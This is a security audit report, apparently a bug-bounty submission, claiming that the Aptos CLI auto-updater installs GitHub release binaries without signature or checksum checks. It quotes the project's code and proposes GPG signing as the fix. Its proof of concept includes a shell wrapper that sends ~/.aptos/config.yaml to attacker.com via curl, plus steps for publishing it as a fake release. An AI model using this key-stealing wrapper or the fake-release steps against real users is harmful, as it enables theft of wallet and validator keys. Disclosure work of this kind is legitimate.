# Audit Report

## Title
Aptos CLI Auto-Update Mechanism Lacks Cryptographic Signature Verification - Remote Code Execution Risk

## Summary
The Aptos CLI auto-update mechanism downloads and installs binaries from GitHub releases without performing any cryptographic signature verification, checksum validation, or integrity checks. This allows an attacker who compromises the GitHub account, release infrastructure, or performs a supply chain attack to distribute malicious binaries that will be automatically installed on validator nodes and user machines.

## Finding Description

The Aptos CLI provides an auto-update feature via `aptos update` command. The update mechanism relies on three key components:

1. **Build Process**: The release workflow builds binaries without generating checksums or cryptographic signatures [1](#0-0) 

2. **Binary Packaging**: The build script only creates zip files with no integrity verification data [2](#0-1) 

3. **Update Installation**: The `build_updater()` function configures the self-update mechanism without any signature or checksum verification [3](#0-2) 

The entire update flow relies solely on HTTPS transport security, with no verification that binaries were:
- Built from legitimate source code
- Signed by Aptos developers  
- Unmodified since release
- Free from supply chain compromises

**Attack Vector:**

An attacker who gains access to:
- The `aptos-labs` GitHub organization (via compromised credentials, insider threat, or social engineering)
- GitHub Actions workflow environment (via malicious dependencies or action compromises)
- GitHub's release infrastructure

Can inject malicious code by:
1. Creating a new release with a higher version number
2. Uploading backdoored binaries to the release
3. Users running `aptos update` will automatically download and execute the malicious binary

The update mechanism trusts the downloaded binary implicitly [4](#0-3) 

## Impact Explanation

This vulnerability qualifies as **CRITICAL SEVERITY** under the Aptos Bug Bounty program for the following reasons:

1. **Remote Code Execution on Validator Nodes**: Validator operators who use `aptos update` would execute attacker-controlled code with validator privileges, enabling:
   - Theft of validator private keys
   - Manipulation of consensus votes
   - Network-wide validator compromise

2. **Loss of Funds**: Compromised CLI can:
   - Steal user private keys during transaction signing
   - Modify transaction payloads before submission
   - Exfiltrate wallet credentials

3. **Consensus/Safety Violations**: If multiple validators are compromised simultaneously:
   - Byzantine behavior could be coordinated
   - Chain splits or safety violations possible
   - Network partition scenarios

4. **Wide Blast Radius**: The CLI is used by:
   - Validator operators (critical infrastructure)
   - Developers (key management, deployment)
   - End users (transaction signing, wallet operations)

This meets the criteria for "Remote Code Execution on validator node" which is explicitly listed as Critical severity with potential rewards up to $1,000,000.

## Likelihood Explanation

**LIKELIHOOD: MEDIUM-HIGH**

Historical precedent demonstrates this is realistic:

1. **GitHub Account Compromises**: Multiple high-profile cryptocurrency projects have experienced GitHub account takeovers (e.g., Ledger npm package compromise, event-stream incident)

2. **Supply Chain Attacks**: The SolarWinds and Codecov incidents show that build infrastructure compromises are achievable and devastating

3. **Low Barrier for Impact**: 
   - Only requires single GitHub account compromise
   - No need for sophisticated zero-day exploits
   - Automated distribution via `aptos update` command
   - Users trust official update mechanisms implicitly

4. **Active Usage**: The auto-update feature is actively promoted and used, as evidenced by the update workflow and documentation

5. **No Defense in Depth**: Complete absence of verification means there are zero technical barriers once GitHub access is obtained

The attack requires moderate sophistication (GitHub account compromise) but has extremely high impact and reliable execution.

## Recommendation

Implement multi-layered cryptographic verification:

### 1. Generate Signatures During Release

Modify `.github/workflows/cli-release.yaml` to:
- Generate SHA256 checksums for each binary
- Sign binaries with GPG using a dedicated Aptos release signing key
- Upload checksums and signatures alongside binaries

```yaml
- name: Generate checksums and signatures
  run: |
    for file in aptos-cli-*.zip; do
      sha256sum "$file" > "$file.sha256"
      gpg --detach-sign --armor "$file"
    done
- name: Create GitHub Release
  with:
    files: |
      aptos-cli-*.zip
      aptos-cli-*.zip.sha256
      aptos-cli-*.zip.asc
```

### 2. Verify Signatures During Update

Modify `crates/aptos/src/update/aptos.rs` to add verification before installation:

```rust
pub fn build_updater(&self, info: &UpdateRequiredInfo) -> Result<Box<dyn ReleaseUpdate>> {
    // ... existing code ...
    
    // Download and verify checksum
    let checksum = download_checksum(&repo_owner, &repo_name, &tag, &target)?;
    let signature = download_signature(&repo_owner, &repo_name, &tag, &target)?;
    
    // Verify GPG signature against embedded public key
    verify_gpg_signature(&checksum, &signature, APTOS_RELEASE_PUBLIC_KEY)?;
    
    Update::configure()
        // ... existing config ...
        .with_checksum_verification(checksum)
        .build()
}
```

### 3. Embed Public Key

Store the Aptos release signing public key in the binary at compile time:

```rust
const APTOS_RELEASE_PUBLIC_KEY: &str = include_str!("../keys/release_key.pub");
```

### 4. Key Management
- Generate dedicated release signing key pair
- Store private key in GitHub Secrets with restricted access
- Publish public key in repository and documentation
- Implement key rotation procedures

## Proof of Concept

**Demonstrating the vulnerability:**

1. Create a malicious binary and package it:
```bash
# Create malicious binary that steals keys
echo '#!/bin/bash
cat ~/.aptos/config.yaml | curl -X POST https://attacker.com/exfil -d @-
exec /tmp/real_aptos "$@"' > malicious_aptos
chmod +x malicious_aptos
zip aptos-cli-99.99.99-Linux-x86_64.zip malicious_aptos
```

2. With compromised GitHub access, create malicious release:
```bash
gh release create aptos-cli-v99.99.99 \
  --title "Aptos CLI Release v99.99.99" \
  aptos-cli-99.99.99-Linux-x86_64.zip
```

3. Victim runs update:
```bash
aptos update
# Output: Successfully updated Aptos CLI from v1.0.0 to v99.99.99
# Malicious binary is now installed with NO verification
```

4. On next CLI usage, private keys are exfiltrated:
```bash
aptos account list
# Keys stolen and sent to attacker.com
```

**Verification of Missing Security:**

Search the codebase confirms zero signature verification: [5](#0-4) 

No checksum files generated during build: [2](#0-1) 

No signature verification in update helper: [6](#0-5) 

## Notes

This vulnerability represents a **complete absence of supply chain security** in the Aptos CLI distribution mechanism. While HTTPS provides transport-layer security, it does not protect against:

- Compromised GitHub accounts
- Malicious releases from authorized but compromised maintainers  
- Supply chain attacks on the build infrastructure
- Man-in-the-middle attacks exploiting CA compromises

The severity is amplified by the CLI's use in critical infrastructure (validator operations) and the automatic nature of updates. Implementation of cryptographic signature verification is a fundamental security requirement for any software auto-update mechanism, especially for blockchain infrastructure where key material and consensus integrity are at stake.

The recommended fix aligns with industry standards (e.g., Debian package signing, Apple code signing, Windows Authenticode) and is a prerequisite for secure software distribution.

### Citations

**File:** .github/workflows/cli-release.yaml (L172-180)
```yaml
      - name: Create GitHub Release
        uses: marvinpinto/action-automatic-releases@919008cf3f741b179569b7a6fb4d8860689ab7f0 # pin@v1.2.1
        with:
          repo_token: "${{ secrets.GITHUB_TOKEN }}"
          automatic_release_tag: "${{ format('aptos-cli-v{0}', inputs.release_version) }}"
          prerelease: false
          title: "${{ format('Aptos CLI Release v{0}', inputs.release_version) }}"
          files: |
            aptos-cli-*.zip
```

**File:** scripts/cli/build_cli_release.sh (L62-67)
```shellscript
# Compress the CLI
ZIP_NAME="$NAME-$VERSION-$PLATFORM_NAME-$ARCH.zip"

echo "Zipping release: $ZIP_NAME"
zip "$ZIP_NAME" "$CRATE_NAME"
mv "$ZIP_NAME" ../..
```

**File:** crates/aptos/src/update/aptos.rs (L96-149)
```rust
    fn build_updater(&self, info: &UpdateRequiredInfo) -> Result<Box<dyn ReleaseUpdate>> {
        let installation_method =
            InstallationMethod::from_env().context("Failed to determine installation method")?;
        match installation_method {
            InstallationMethod::Source => {
                return Err(anyhow!(
                    "Detected this CLI was built from source, refusing to update"
                ));
            },
            InstallationMethod::Homebrew => {
                return Err(anyhow!(
                    "Detected this CLI comes from homebrew, use `brew upgrade aptos` instead"
                ));
            },
            InstallationMethod::PackageManager => {
                return Err(anyhow!(
                    "Detected this CLI comes from a package manager, use your package manager to update instead"
                ));
            },
            InstallationMethod::Other => {},
        }

        // Determine the target we should download. This is necessary because we don't
        // name our binary releases using the target triples nor do we build specifically
        // for all major triples, so we have to generalize to one of the binaries we do
        // happen to build. We figure this out based on what system the CLI was built on.
        let build_info = cli_build_information();
        let target = match build_info.get(BUILD_OS).context("Failed to determine build info of current CLI")?.as_str() {
            "linux-x86_64" => "Linux-x86_64",
            "linux-aarch64" => "Linux-aarch64",
            "macos-x86_64" => "macOS-x86_64",
            "macos-aarch64" => "macOS-arm64",
            "windows-x86_64" => "Windows-x86_64",
            wildcard => return Err(anyhow!("Self-updating is not supported on your OS ({}) right now, please download the binary manually", wildcard)),
        };

        let current_version = match &info.current_version {
            Some(version) => version,
            None => unreachable!("current_version should always be Some at this point"),
        };

        // Build a new configuration that will direct the library to download the
        // binary with the target version tag and target that we determined above.
        Update::configure()
            .repo_owner(&self.repo_owner)
            .repo_name(&self.repo_name)
            .bin_name("aptos")
            .current_version(current_version)
            .target_version_tag(&format!("aptos-cli-v{}", info.target_version))
            .target(target)
            .no_confirm(self.prompt_options.assume_yes)
            .build()
            .map_err(|e| anyhow!("Failed to build self-update configuration: {:#}", e))
    }
```

**File:** crates/aptos/src/update/mod.rs (L53-56)
```rust
        // Update the binary.
        let result = updater
            .update()
            .map_err(|e| anyhow!("Failed to update {}: {:#}", self.pretty_name(), e))?;
```

**File:** crates/aptos/src/update/update_helper.rs (L67-77)
```rust
    Update::configure()
        .bin_install_dir(install_dir)
        .bin_name(binary_name)
        .repo_owner(&repo_owner)
        .repo_name(&repo_name)
        .current_version(current_version)
        .target_version_tag(&format!("v{}", info.target_version))
        .target(&target)
        .no_confirm(assume_yes)
        .build()
        .map_err(|e| anyhow!("Failed to build self-update configuration: {:#}", e))
```
